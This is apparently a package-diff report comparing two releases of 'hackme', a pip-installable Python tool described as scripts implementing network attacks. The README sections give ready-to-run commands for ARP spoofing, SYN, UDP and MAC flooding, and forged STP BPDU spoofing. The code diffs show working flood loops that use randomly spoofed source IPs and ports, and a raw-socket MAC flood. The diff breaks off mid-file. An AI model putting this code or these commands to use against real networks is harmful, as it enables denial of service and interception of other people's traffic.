# Comparing `tmp/hackme-0.4.0.tar.gz` & `tmp/hackme-1.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "hackme-0.4.0.tar", last modified: Mon Sep 19 07:21:34 2022, max compression
+gzip compressed data, was "hackme-1.0.0.tar", last modified: Mon Apr 10 06:29:19 2023, max compression
```

## Comparing `hackme-0.4.0.tar` & `hackme-1.0.0.tar`

### file list

```diff
@@ -1,23 +1,25 @@
-drwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)        0 2022-09-19 07:21:34.483703 hackme-0.4.0/
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)    35149 2022-08-27 13:54:44.000000 hackme-0.4.0/LICENSE
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     4126 2022-09-19 07:21:34.483703 hackme-0.4.0/PKG-INFO
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     3311 2022-09-19 07:20:56.000000 hackme-0.4.0/README.md
-drwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)        0 2022-09-19 07:21:34.483703 hackme-0.4.0/hackme/
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)      937 2022-09-19 07:20:56.000000 hackme-0.4.0/hackme/__init__.py
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     5858 2022-09-19 07:20:56.000000 hackme-0.4.0/hackme/arp_spoofing.py
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     3480 2022-09-19 07:20:56.000000 hackme-0.4.0/hackme/helpers.py
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     3692 2022-09-19 07:20:56.000000 hackme-0.4.0/hackme/mac_flood.py
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     4388 2022-09-19 07:20:56.000000 hackme-0.4.0/hackme/syn_flood.py
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     4622 2022-09-19 07:20:56.000000 hackme-0.4.0/hackme/udp_flood.py
-drwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)        0 2022-09-19 07:21:34.483703 hackme-0.4.0/hackme.egg-info/
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     4126 2022-09-19 07:21:34.000000 hackme-0.4.0/hackme.egg-info/PKG-INFO
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)      385 2022-09-19 07:21:34.000000 hackme-0.4.0/hackme.egg-info/SOURCES.txt
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)        1 2022-09-19 07:21:34.000000 hackme-0.4.0/hackme.egg-info/dependency_links.txt
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       42 2022-09-19 07:21:34.000000 hackme-0.4.0/hackme.egg-info/entry_points.txt
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)        1 2022-08-30 07:04:27.000000 hackme-0.4.0/hackme.egg-info/not-zip-safe
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       23 2022-09-19 07:21:34.000000 hackme-0.4.0/hackme.egg-info/requires.txt
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       17 2022-09-19 07:21:34.000000 hackme-0.4.0/hackme.egg-info/top_level.txt
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     7056 2022-09-19 07:20:56.000000 hackme-0.4.0/hackmeapp.py
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)      930 2022-09-19 07:20:56.000000 hackme-0.4.0/pyproject.toml
--rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       38 2022-09-19 07:21:34.483703 hackme-0.4.0/setup.cfg
--rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     1359 2022-09-19 07:20:56.000000 hackme-0.4.0/setup.py
+drwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)        0 2023-04-10 06:29:19.828887 hackme-1.0.0/
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)    35149 2022-08-27 13:54:44.000000 hackme-1.0.0/LICENSE
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     5132 2023-04-10 06:29:19.828887 hackme-1.0.0/PKG-INFO
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     4317 2023-04-10 06:26:43.000000 hackme-1.0.0/README.md
+drwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)        0 2023-04-10 06:29:19.828887 hackme-1.0.0/hackme/
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)      990 2023-03-24 20:07:55.000000 hackme-1.0.0/hackme/__init__.py
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     5405 2022-09-22 11:21:21.000000 hackme-1.0.0/hackme/arp_spoofing.py
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     4524 2023-03-24 20:07:55.000000 hackme-1.0.0/hackme/bpdu.py
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     3903 2022-10-20 06:28:14.000000 hackme-1.0.0/hackme/flycheck_udp_flood.py
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     4018 2022-12-13 18:17:28.000000 hackme-1.0.0/hackme/helpers.py
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     3404 2023-03-24 20:07:55.000000 hackme-1.0.0/hackme/mac_flood.py
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     4054 2022-09-22 11:21:21.000000 hackme-1.0.0/hackme/syn_flood.py
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     3903 2022-09-22 11:21:21.000000 hackme-1.0.0/hackme/udp_flood.py
+drwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)        0 2023-04-10 06:29:19.828887 hackme-1.0.0/hackme.egg-info/
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)     5132 2023-04-10 06:29:19.000000 hackme-1.0.0/hackme.egg-info/PKG-INFO
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)      429 2023-04-10 06:29:19.000000 hackme-1.0.0/hackme.egg-info/SOURCES.txt
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)        1 2023-04-10 06:29:19.000000 hackme-1.0.0/hackme.egg-info/dependency_links.txt
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       42 2023-04-10 06:29:19.000000 hackme-1.0.0/hackme.egg-info/entry_points.txt
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)        1 2022-08-30 07:04:27.000000 hackme-1.0.0/hackme.egg-info/not-zip-safe
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       33 2023-04-10 06:29:19.000000 hackme-1.0.0/hackme.egg-info/requires.txt
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       17 2023-04-10 06:29:19.000000 hackme-1.0.0/hackme.egg-info/top_level.txt
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     8027 2023-04-10 06:26:43.000000 hackme-1.0.0/hackmeapp.py
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)      943 2023-04-10 06:28:24.000000 hackme-1.0.0/pyproject.toml
+-rw-rw-r--   0 nadzeya   (1000) nadzeya   (1000)       38 2023-04-10 06:29:19.828887 hackme-1.0.0/setup.cfg
+-rwxrwxr-x   0 nadzeya   (1000) nadzeya   (1000)     1408 2023-04-10 06:28:35.000000 hackme-1.0.0/setup.py
```

### Comparing `hackme-0.4.0/LICENSE` & `hackme-1.0.0/LICENSE`

 * *Files identical despite different names*

### Comparing `hackme-0.4.0/PKG-INFO` & `hackme-1.0.0/PKG-INFO`

 * *Files 21% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: hackme
-Version: 0.4.0
+Version: 1.0.0
 Summary: Scripts that implement different network attacks
 Author-email: Nadzeya Hutsko <nadzya.info@gmail.com>
 License: GPL-3.0 license
 Project-URL: Homepage, https://github.com/nadzyah/hackme
 Project-URL: Bug Tracker, https://github.com/nadzyah/hackme/issues
 Classifier: Environment :: Console
 Classifier: Intended Audience :: Telecommunications Industry
@@ -21,27 +21,27 @@
 
 # Hack Me
 
 ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
 ![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
 [![GitHub license](https://img.shields.io/github/license/nadzyah/hackme?style=for-the-badge)](https://github.com/nadzyah/hackme/blob/main/LICENSE)
 
-A collection of scripts that implement different network attacks. **For information purposes only.** 
+A collection of scripts that implement different network attacks. **For informational purposes only.** 
 
 Any contributor to this project doesn't take any responsibility for illegal usage of any script from this project.
 
 # Installation and Usage
 
 The tested environment:
 * Python v3.10
 * Ubuntu 22.04 LTS
 
 Make sure that `python3-scapy` is installed on your system: `sudo apt-get install python3-scapy`
 
-You can either run hackmeapp from a checkout of the code, or install it like any other python project. Keep in mind that a lot of scripts here can be executed only with the root privileges, so you need to run it with sudo.
+You can either run `hackmeapp.py` from a checkout of the code, or install it like any other python project. Keep in mind that a lot of scripts here can be executed only with the root privileges, so you need to run it with sudo.
 
 ```bash
 $ sudo pip3 install hackme
 $ sudo hackme
 usage: hackmeapp.py [-h] [--debug] {attack} ...
 ```
 
@@ -59,62 +59,86 @@
 You can read about ARP spoofing attack [here](https://www.wikiwand.com/en/ARP_spoofing).
 
 Example usage:
 
 ```bash
 $ sudo hackme --debug arpspoof -i wlp2s0 -m aa:aa:aa:aa:aa:aa -gm BB-BB-BB-BB-BB-BB -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
 ```
+
 where:
+
 * `wlp2s0` — your network interface
 * `aa:aa:aa:aa:aa:aa` — the interface MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
 * `bb:bb:bb:bb:bb:bb` — the gateway's MAC-address
 * `192.168.0.1` — the gateway's IP-address
 * `cc:cc:cc:cc:cc:cc` — the victim's MAC-address
 * `192.168.0.108` — the victim's IP-address
 
 Run `sudo hackme arpspoof --help` to get more information.
 
 ## SYN Flood
 
 You can read about SYN flood attack [here](https://www.wikiwand.com/en/SYN_flood).
 
 Example usage:
+
 ```bash
 $ sudo hackme --debug synflood -d 172.17.17.10 -p 443 -c 1000
 ```
 where:
+
 * `172.17.17.10` — server's IP-address
 * `443` — server's port
 * `1000` — the number of packets to be sent
 
 Run `sudo hackme synflood --help` to get more information.
 
 ## UDP Flood
 
 You can read about UDP flood attack [here](https://www.wikiwand.com/en/UDP_flood).
 
 Example usage:
+
 ```bash
 $ sudo hackme --debug udpflood -d 172.17.17.10 -p 53 -c 1000
 ```
+
 where:
+
 * `172.17.17.10` — server's IP-address
 * `53` — server's port
 * `1000` — the number of packets to be sent
 
 Run `sudo hackme udpflood --help` to get more information.
 
 ## MAC Flood
 
 You can read about MAC flood attack [here](https://www.wikiwand.com/en/MAC_flooding).
 
 Example usage:
+
 ```bash
-$ sudo hackme --debug macflood -i lxdbr0 -vm "aa:aa:aa:aa:aa:aa" -c 100000
+$ sudo hackme --debug macflood -i wlp2s0 -vm "aa:aa:aa:aa:aa:aa" -c 100000
 ```
+
 where:
-* `lxdbr0` — your network interface
+
+* `wlp2s0` — your network interface
 * `aa:aa:aa:aa:aa:aa` — the victim's MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
 * `100000` — the number of packets to be sent
 
 Run `sudo hackme macflood --help` to get more information.
 
+## BPDU Spoofing
+
+On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST exchange BPDUs to calculate a spanning tree and trim the network into a loop-free tree topology. If forged BPDUs are sent to attack a device with edge ports and received by them, the device will automatically change the edge ports to non-edge ports and recalculate the spanning tree. If the bridge priority in the BPDUs sent by an attacker is higher than the priority of the root bridge, the network topology will change, thereby interrupting service traffic.
+
+Example usage:
+
+```bash
+sudo ./hackmeapp.py --debug stpspoof -i wlp2s0 -smac "aa:aa:aa:aa:aa:aa" -dmac "bb:bb:bb:bb:bb:bb" -p 4096
+```
+
+* `wlp2s0` — your network interface
+* `aa:aa:aa:aa:aa:aa` — your MAC-address
+* `bb:bb:bb:bb:bb:bb` — victim switch's MAC-address
+* `4096` — priority for choosing the root switch (the lower the number, the higher the priority, so make sure it's low enough to become the root). Must be divisible by 4096
```

### Comparing `hackme-0.4.0/hackme/__init__.py` & `hackme-1.0.0/hackme/__init__.py`

 * *Files 24% similar despite different names*

```diff
@@ -17,15 +17,17 @@
 """The hackme package"""
 
 
 from hackme.arp_spoofing import ARPSpoofer
 from hackme.syn_flood import SYNFlooder
 from hackme.udp_flood import UDPFlooder
 from hackme.mac_flood import MACFlooder
+from hackme.bpdu import BPDUPacket
 
 
 __all__ = [
     "ARPSpoofer",
     "SYNFlooder",
     "UDPFlooder",
     "MACFlooder",
+    "BPDUPacket",
 ]
```

### Comparing `hackme-0.4.0/hackme/arp_spoofing.py` & `hackme-1.0.0/hackme/arp_spoofing.py`

 * *Files 12% similar despite different names*

```diff
@@ -13,20 +13,24 @@
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
 # Written by:
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
 """The module for ARP spoofing class"""
 
 
+import sys
 import socket
-import textwrap
 import time
 import logging
 
-from .helpers import make_valid_mac_address, validate_ip_address
+from .helpers import (
+    make_valid_mac_address,
+    validate_ip_address,
+    get_description_from_wiki,
+)
 
 
 _LOGGER = logging.getLogger(__name__)
 
 
 class ARPSpoofer:
     """A class that represents an ARP spoofing attack"""
@@ -45,30 +49,19 @@
         if interface and your_mac:
             _LOGGER.debug(
                 "Creating an ARPSpoofer object with your interface %s"
                 " and MAC-address %s",
                 self.interface,
                 your_mac,
             )
-        self.description = textwrap.dedent(
-            """\
-            The ARP spoofing attack description:
-
-            In computer networking, ARP spoofing, ARP cache poisoning,
-            or ARP poison routing, is a technique by which an attacker
-            sends (spoofed) Address Resolution Protocol (ARP) messages
-            onto a local area network.
-            Generally, the aim is to associate the attacker's MAC
-            address with the IP address of another host, such as the
-            default gateway, causing any traffic meant for that IP address
-            to be sent to the attacker instead.
-
-            Read more: https://www.wikiwand.com/en/ARP_spoofing
-            """
-        )
+        description = get_description_from_wiki("ARP Spoofing")
+        if "does not match any pages" in description:
+            _LOGGER.error(description)
+            sys.exit(1)
+        self.description = description
 
     def add_gateway(self, gateway_mac, gateway_ip):
         """
         Add info about the gateway
 
         :gateway_mac: gateway's MAC-address (i.e. "192.168.100.1")
         :gateway_ip: gateway's IP-address from your network
```

### Comparing `hackme-0.4.0/hackme/helpers.py` & `hackme-1.0.0/hackme/helpers.py`

 * *Files 14% similar despite different names*

```diff
@@ -13,18 +13,21 @@
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
 # Written by:
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
 """Functions that are used by other scripts in this module"""
 
 
+import os
 import re
 import binascii
+from textwrap import fill
 from ipaddress import ip_address
 from random import randint
+import wikipedia
 
 
 def make_valid_mac_address(mac):
     """
     Check if MAC address is valid (format aa:aa:aa:aa:aa:aa)
     Then convert it to the next format: b"\xaa\xaa\xaa\xaa\xaa\xaa"
 
@@ -121,7 +124,25 @@
     fillwith = "#"
     dec = 2
     leng = 50
     percent = ("{0:." + str(dec) + "f}").format(100 * (it / float(total)))
     fill_length = int(leng * it // total)
     prog_bar = fillwith * fill_length + "-" * (leng - fill_length)
     print(f"\rProgress |{prog_bar}| {percent}% Complete", end="\r")
+
+
+def get_description_from_wiki(name, width=None):
+    """
+    Return a pretty attack description from wikipedia
+
+    :name: the name of an article
+    :width: the text width
+    """
+    try:
+        page = wikipedia.page(name)
+    except wikipedia.exceptions.PageError as exc:
+        return str(exc)
+    if width is None:
+        width = os.get_terminal_size().columns * 0.7
+    result = fill(page.summary, width=width)
+    result += "\n\n" + "Source: " + page.url
+    return result
```

### Comparing `hackme-0.4.0/hackme/mac_flood.py` & `hackme-1.0.0/hackme/mac_flood.py`

 * *Files 19% similar despite different names*

```diff
@@ -16,17 +16,21 @@
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
 """The module for  class"""
 
 
 import socket
 import sys
 import logging
-import textwrap
 
-from .helpers import random_MAC, make_valid_mac_address, progress_bar
+from .helpers import (
+    random_MAC,
+    make_valid_mac_address,
+    progress_bar,
+    get_description_from_wiki,
+)
 
 _LOGGER = logging.getLogger(__name__)
 
 
 class MACFlooder:  # pylint: disable=R0903
     """A class that represents a MAC flood attach"""
 
@@ -48,26 +52,19 @@
         if interface and dst_mac and count:
             _LOGGER.debug(
                 "Creating an MACFlooder object with your interface %s"
                 " and victim's MAC-address %s",
                 self.interface,
                 dst_mac,
             )
-        self.description = textwrap.dedent(
-            """\
-            MAC flooding is a technique employed to compromise the
-            security of network switches. The attack works by forcing
-            legitimate MAC table contents out of the switch and forcing
-            a unicast flooding behavior potentially sending sensitive
-            information to portions of the network where it is not
-            normally intended to go.
-
-            Read more: https://www.wikiwand.com/en/MAC_flooding
-            """
-        )
+        description = get_description_from_wiki("MAC flood")
+        if "does not match any pages" in description:
+            _LOGGER.error(description)
+            sys.exit(1)
+        self.description = description
 
     def run(self):
         """
         Run the MAC flood attack until KeyboardInterrupt
         or the number of all packets is sent
         """
         total = 0
@@ -85,15 +82,15 @@
         payload = "PAYLOAD".encode()
         for x in range(0, self.count):  # pylint: disable=C0103
             try:
                 rand_mac = random_MAC()
                 src_mac = make_valid_mac_address(rand_mac)
                 sock.sendall(self.dst_mac + src_mac + protocol + payload)
                 _LOGGER.debug(
-                    "Sending a packet #%i with <source_MAC> %s",
+                    "Sending a packet #%i with source_MAC %s",
                     x + 1,
                     rand_mac,
                 )
                 progress_bar(x, self.count)
                 total += 1
             except KeyboardInterrupt:
                 _LOGGER.info("\nTotal packets sent: %i\n", total)
```

### Comparing `hackme-0.4.0/hackme/syn_flood.py` & `hackme-1.0.0/hackme/flycheck_udp_flood.py`

 * *Files 12% similar despite different names*

```diff
@@ -10,125 +10,113 @@
 # GNU General Public License for more details.
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
 # Written by:
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
-"""The module for SYNFlooder class"""
+"""The module for UDP flood class"""
 
 
 import sys
-import textwrap
 import logging
-from random import randint
-from scapy.all import IP, TCP, send  # pylint: disable=E0401,E0611
+from scapy.all import IP, UDP, send  # pylint: disable=E0401,E0611
 
 from .helpers import (
     random_IP,
     random_port,
     validate_ip_address,
     validate_port,
     progress_bar,
+    get_description_from_wiki,
 )
 
 
 _LOGGER = logging.getLogger(__name__)
 
 
-class SYNFlooder:  # pylint: disable=R0903
-    """A class that represents a SYN flood attack"""
+class UDPFlooder:  # pylint: disable=R0903
+    """A class that represents a UDP flood attack"""
 
     def __init__(self, dst_ip, dst_port, count=None):
         """
-        Initialaze a SYN flood object
+        Initialaze a UDP flood object
 
         :dst_ip: the victim's IP
         :dst_port: the victim's port
         """
         self.dst_ip = validate_ip_address(dst_ip)
         self.dst_port = validate_port(dst_port)
         if count is None:
             self.count = 9_223_372_036_854_775_807
         else:
             self.count = int(count)
         if dst_ip and dst_port and count:
             _LOGGER.debug(
-                "Creating a SYNFlooder object with destination IP %s"
+                "Creating a UDPFlooder object with destination IP %s"
                 " and destination port %i",
                 self.dst_ip,
                 self.dst_port,
             )
-        self.description = textwrap.dedent(
-            """\
-            The SYN flood attack description:
-
-            A SYN flood is a form of denial-of-service attack in which
-            an attacker rapidly initiates a connection to a server without
-            finalizing the connection. The server has to spend resources
-            waiting for half-opened connections, which can consume enough
-            resources to make the system unresponsive to legitimate traffic.
-
-            Read more: https://www.wikiwand.com/en/SYN_flood
-            """
-        )
+        description = get_description_from_wiki("UDP flood")
+        if "does not match any pages" in description:
+            _LOGGER.error(description)
+            sys.exit(1)
+        self.description = description
 
     def _create_ip_packet(self):
         """
         Create an IP packet with random source IP
 
         :return: scapy IP object
         """
         IP_Packet = IP()  # pylint: disable=C0103
         IP_Packet.src = random_IP()
         IP_Packet.dst = self.dst_ip
         return IP_Packet
 
-    def _create_tcp_packet(self):
+    def _create_udp_packet(self):
         """
-        Create a TCP packet with random source port
+        Create a UDP packet with random source port
 
-        :return: scapy TCP packet
+        :return: scapy UDP packet
         """
-        TCP_Packet = TCP()  # pylint: disable=C0103
-        TCP_Packet.sport = random_port()
-        TCP_Packet.dport = self.dst_port
-        TCP_Packet.flags = "S"
-        TCP_Packet.seq = randint(1000, 9000)
-        TCP_Packet.window = randint(1000, 9000)
-        return TCP_Packet
+        UDP_Packet = UDP()  # pylint: disable=C0103
+        UDP_Packet.sport = random_port()
+        UDP_Packet.dport = self.dst_port
+        return UDP_Packet
 
     def run(self):
         """
         Run the SYN flood attack until KeyboardInterrupt
         or the number of all packets is sent
         """
         total = 0
-        _LOGGER.warning(
+        _LOGGER.info(
             "Trying to send %i packets. Press Ctrl+C to "
             "stop before all the packets will be sent",
             self.count,
         )
 
         for x in range(0, self.count):  # pylint: disable=C0103
             try:
                 # Ether_Frame = Ether()
                 # Ether_Frame.scr = randomMAC()
                 IP_Packet = self._create_ip_packet()  # pylint: disable=C0103
-                TCP_Packet = self._create_tcp_packet()  # pylint: disable=C0103
-                send(IP_Packet / TCP_Packet, verbose=0)
+                UDP_Packet = self._create_udp_packet()  # pylint: disable=C0103
+                send(IP_Packet / UDP_Packet, verbose=0)
                 _LOGGER.debug(
                     "Sending a packet #%i with <source_IP>:<source_port>"
                     " %s:%s",
-                    x,
+                    x + 1,
                     IP_Packet.src,
-                    TCP_Packet.sport,
+                    UDP_Packet.sport,
                 )
                 progress_bar(x, self.count)
                 total += 1
             except KeyboardInterrupt:
                 _LOGGER.info("\nTotal packets sent: %i\n", total)
-                _LOGGER.warning("\nStopping SYN flood attack")
+                _LOGGER.warning("\nStopping UDP flood attack")
                 sys.exit(0)
 
         progress_bar(self.count, self.count)
         _LOGGER.info("\nTotal packets sent: %i\n", total)
```

### Comparing `hackme-0.4.0/hackme/udp_flood.py` & `hackme-1.0.0/hackme/udp_flood.py`

 * *Files 9% similar despite different names*

```diff
@@ -14,26 +14,24 @@
 #
 # Written by:
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
 """The module for UDP flood class"""
 
 
 import sys
-
-# import socket
 import logging
-import textwrap
 from scapy.all import IP, UDP, send  # pylint: disable=E0401,E0611
 
 from .helpers import (
     random_IP,
     random_port,
     validate_ip_address,
     validate_port,
     progress_bar,
+    get_description_from_wiki,
 )
 
 
 _LOGGER = logging.getLogger(__name__)
 
 
 class UDPFlooder:  # pylint: disable=R0903
@@ -55,34 +53,19 @@
         if dst_ip and dst_port and count:
             _LOGGER.debug(
                 "Creating a UDPFlooder object with destination IP %s"
                 " and destination port %i",
                 self.dst_ip,
                 self.dst_port,
             )
-        self.description = textwrap.dedent(
-            """\
-            A UDP flood attack is a volumetric denial-of-service (DoS)
-            attack using the User Datagram Protocol (UDP), a
-            sessionless/connectionless computer networking protocol.
-
-            A UDP flood attack can be initiated by sending a large number
-            of UDP packets to random ports on a remote host. As a result,
-            the distant host will:
-              - Check for the application listening at that port;
-              - See that no application listens at that port;
-              - Reply with an ICMP Destination Unreachable packet.
-
-            Thus, for a large number of UDP packets, the victimized system
-            will be forced into sending many ICMP packets, eventually leading
-            it to be unreachable by other clients.
-
-            Read more: https://www.wikiwand.com/en/UDP_flood
-            """
-        )
+        description = get_description_from_wiki("UDP flood")
+        if "does not match any pages" in description:
+            _LOGGER.error(description)
+            sys.exit(1)
+        self.description = description
 
     def _create_ip_packet(self):
         """
         Create an IP packet with random source IP
 
         :return: scapy IP object
         """
```

### Comparing `hackme-0.4.0/hackme.egg-info/PKG-INFO` & `hackme-1.0.0/hackme.egg-info/PKG-INFO`

 * *Files 21% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: hackme
-Version: 0.4.0
+Version: 1.0.0
 Summary: Scripts that implement different network attacks
 Author-email: Nadzeya Hutsko <nadzya.info@gmail.com>
 License: GPL-3.0 license
 Project-URL: Homepage, https://github.com/nadzyah/hackme
 Project-URL: Bug Tracker, https://github.com/nadzyah/hackme/issues
 Classifier: Environment :: Console
 Classifier: Intended Audience :: Telecommunications Industry
@@ -21,27 +21,27 @@
 
 # Hack Me
 
 ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
 ![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
 [![GitHub license](https://img.shields.io/github/license/nadzyah/hackme?style=for-the-badge)](https://github.com/nadzyah/hackme/blob/main/LICENSE)
 
-A collection of scripts that implement different network attacks. **For information purposes only.** 
+A collection of scripts that implement different network attacks. **For informational purposes only.** 
 
 Any contributor to this project doesn't take any responsibility for illegal usage of any script from this project.
 
 # Installation and Usage
 
 The tested environment:
 * Python v3.10
 * Ubuntu 22.04 LTS
 
 Make sure that `python3-scapy` is installed on your system: `sudo apt-get install python3-scapy`
 
-You can either run hackmeapp from a checkout of the code, or install it like any other python project. Keep in mind that a lot of scripts here can be executed only with the root privileges, so you need to run it with sudo.
+You can either run `hackmeapp.py` from a checkout of the code, or install it like any other python project. Keep in mind that a lot of scripts here can be executed only with the root privileges, so you need to run it with sudo.
 
 ```bash
 $ sudo pip3 install hackme
 $ sudo hackme
 usage: hackmeapp.py [-h] [--debug] {attack} ...
 ```
 
@@ -59,62 +59,86 @@
 You can read about ARP spoofing attack [here](https://www.wikiwand.com/en/ARP_spoofing).
 
 Example usage:
 
 ```bash
 $ sudo hackme --debug arpspoof -i wlp2s0 -m aa:aa:aa:aa:aa:aa -gm BB-BB-BB-BB-BB-BB -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
 ```
+
 where:
+
 * `wlp2s0` — your network interface
 * `aa:aa:aa:aa:aa:aa` — the interface MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
 * `bb:bb:bb:bb:bb:bb` — the gateway's MAC-address
 * `192.168.0.1` — the gateway's IP-address
 * `cc:cc:cc:cc:cc:cc` — the victim's MAC-address
 * `192.168.0.108` — the victim's IP-address
 
 Run `sudo hackme arpspoof --help` to get more information.
 
 ## SYN Flood
 
 You can read about SYN flood attack [here](https://www.wikiwand.com/en/SYN_flood).
 
 Example usage:
+
 ```bash
 $ sudo hackme --debug synflood -d 172.17.17.10 -p 443 -c 1000
 ```
 where:
+
 * `172.17.17.10` — server's IP-address
 * `443` — server's port
 * `1000` — the number of packets to be sent
 
 Run `sudo hackme synflood --help` to get more information.
 
 ## UDP Flood
 
 You can read about UDP flood attack [here](https://www.wikiwand.com/en/UDP_flood).
 
 Example usage:
+
 ```bash
 $ sudo hackme --debug udpflood -d 172.17.17.10 -p 53 -c 1000
 ```
+
 where:
+
 * `172.17.17.10` — server's IP-address
 * `53` — server's port
 * `1000` — the number of packets to be sent
 
 Run `sudo hackme udpflood --help` to get more information.
 
 ## MAC Flood
 
 You can read about MAC flood attack [here](https://www.wikiwand.com/en/MAC_flooding).
 
 Example usage:
+
 ```bash
-$ sudo hackme --debug macflood -i lxdbr0 -vm "aa:aa:aa:aa:aa:aa" -c 100000
+$ sudo hackme --debug macflood -i wlp2s0 -vm "aa:aa:aa:aa:aa:aa" -c 100000
 ```
+
 where:
-* `lxdbr0` — your network interface
+
+* `wlp2s0` — your network interface
 * `aa:aa:aa:aa:aa:aa` — the victim's MAC-address (can be written as `AA:AA:AA:AA:AA:AA`, `AA-AA-AA-AA-AA-AA` and `aa-aa-aa-aa-aa-aa`)
 * `100000` — the number of packets to be sent
 
 Run `sudo hackme macflood --help` to get more information.
 
+## BPDU Spoofing
+
+On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST exchange BPDUs to calculate a spanning tree and trim the network into a loop-free tree topology. If forged BPDUs are sent to attack a device with edge ports and received by them, the device will automatically change the edge ports to non-edge ports and recalculate the spanning tree. If the bridge priority in the BPDUs sent by an attacker is higher than the priority of the root bridge, the network topology will change, thereby interrupting service traffic.
+
+Example usage:
+
+```bash
+sudo ./hackmeapp.py --debug stpspoof -i wlp2s0 -smac "aa:aa:aa:aa:aa:aa" -dmac "bb:bb:bb:bb:bb:bb" -p 4096
+```
+
+* `wlp2s0` — your network interface
+* `aa:aa:aa:aa:aa:aa` — your MAC-address
+* `bb:bb:bb:bb:bb:bb` — victim switch's MAC-address
+* `4096` — priority for choosing the root switch (the lower the number, the higher the priority, so make sure it's low enough to become the root). Must be divisible by 4096
```

### Comparing `hackme-0.4.0/hackmeapp.py` & `hackme-1.0.0/hackmeapp.py`

 * *Files 8% similar despite different names*

```diff
@@ -16,43 +16,114 @@
 #        Nadzeya Hutsko <nadzya.info@gmail.com>
 """The orchestrator for all attacks"""
 
 
 import sys
 import argparse
 import logging
+from textwrap import dedent
 from warnings import filterwarnings
 
 filterwarnings("ignore")
 
 from hackme import *  # pylint: disable=W0401,C0413  # noqa: F403,E402
 
 
 _LOGGER = logging.getLogger(__name__)
 
 
-def run_arp_spoofing(arp_spoofer, gw_mac, gw_ip, victim_mac, victim_ip):
+def run_arp_spoofing(subparser, args):
     """Run the ARP spoofing attack"""
-    arp_spoofer.add_gateway(gw_mac, gw_ip)
-    arp_spoofer.add_victim(victim_mac, victim_ip)
+    arp_spoofer = ARPSpoofer(args.iface, args.mac)  # noqa: F405
+    if args.desc:
+        print(arp_spoofer.description)
+        sys.exit(0)
+    if (
